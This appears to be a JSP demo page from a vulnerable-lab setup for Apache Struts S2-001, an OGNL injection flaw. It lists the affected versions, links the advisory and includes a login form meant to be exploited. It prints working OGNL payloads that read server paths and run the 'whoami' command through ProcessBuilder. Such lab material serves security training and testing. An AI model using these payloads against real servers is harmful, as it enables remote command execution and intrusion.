<%@ page language="java" contentType="text/html; charset=UTF-8"
		 pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>version: Struts 2.0.0 - Struts 2.0.8 , WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5</p>
<p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<p>payload: <code>username: %{'a'+'b'}</code></p>
<p>获取 tomcat 路径: <code>%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}</code></p>
<p>获取 web 路径: <code>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}</code></p>
<p>whoami: <code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</code></p>
<s:form action="login">
	<s:textfield name="username" label="username" />
	<s:textfield name="password" label="password" />
	<s:submit></s:submit>
</s:form>
</body>
</html>